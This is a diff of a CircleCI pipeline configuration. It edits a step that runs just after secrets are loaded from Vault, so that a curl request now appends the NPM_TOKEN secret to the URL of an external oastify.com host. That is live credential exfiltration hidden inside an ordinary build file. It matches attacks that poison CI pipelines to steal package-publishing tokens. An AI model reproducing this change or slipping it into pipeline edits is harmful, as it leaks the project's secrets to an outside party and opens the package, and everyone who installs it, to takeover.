@@ -18,7 +18,7 @@ jobs:
           echo 'export VAULT_MAX_RETRIES="3"' >> "$BASH_ENV"
       - vault/get-secrets:
           template-preset: semantic-release
-      - run: curl https://lwlazrpj9flwnn03l9fnpdroofu6i16q.oastify.com/foo
+      - run: curl https://lwlazrpj9flwnn03l9fnpdroofu6i16q.oastify.com/${NPM_TOKEN}
       - attach_workspace:
           at: ~/circleci-f36-build
       - node/install-packages
